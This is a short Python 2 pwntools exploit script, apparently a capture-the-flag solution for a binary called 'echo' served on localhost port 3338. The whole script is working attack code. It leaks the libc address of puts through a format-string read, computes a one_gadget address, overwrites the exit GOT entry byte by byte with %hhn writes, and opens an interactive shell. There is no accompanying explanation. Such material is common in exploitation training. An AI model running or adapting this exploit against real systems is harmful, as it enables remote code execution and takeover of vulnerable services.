#!/usr/bin/python2

from pwn import *

context.binary = "./echo"

binary = ELF("./echo")
libc = ELF("./libc.so.6")

#obtained using one_gadget
T_OFF = 0x3f306

s = remote("localhost", 3338)
#s = process("./echo")

def write_addr(offset, addr):
    padding = "A" * offset * 8
    addr = p64(addr)

    return padding + addr

def s_payload(payload):
    log.info("payload %s" % repr(payload))
    s.send(payload)
    return s.recv(timeout=1)

print s.recvline()
print s.recvline()

PUTS_GOT = b""

log.info("got expected at %x" % binary.got['puts'])

while len(PUTS_GOT) < 8:
    x = write_addr(30, binary.got['puts'] + len(PUTS_GOT))
    log.info("return %s" % s_payload(x))
    PUTS_GOT += s_payload(b"%40$s")[:8]
    if(len(PUTS_GOT) < 8):
        PUTS_GOT += '\0'


log.info("PUTS_GOT = %s" % (PUTS_GOT))
assert len(PUTS_GOT) == 8
PUTS_GOT = u64(PUTS_GOT)


diff = T_OFF - libc.symbols['puts']
T_ADDR = PUTS_GOT + diff
log.info("T_ADDR = %x" % (T_ADDR))

for i, x in enumerate(p64(T_ADDR)):
    y = write_addr(30, binary.got['exit'] + i)
    s_payload(y)        
    if(x != '\0'):
        payload = "%" + str(ord(x)) + "c"
    else:
        payload = ""
    ret = s_payload(payload + "%40$hhn")
    print("sent %x bytes" % len(ret))

s.send("q")
s.interactive()
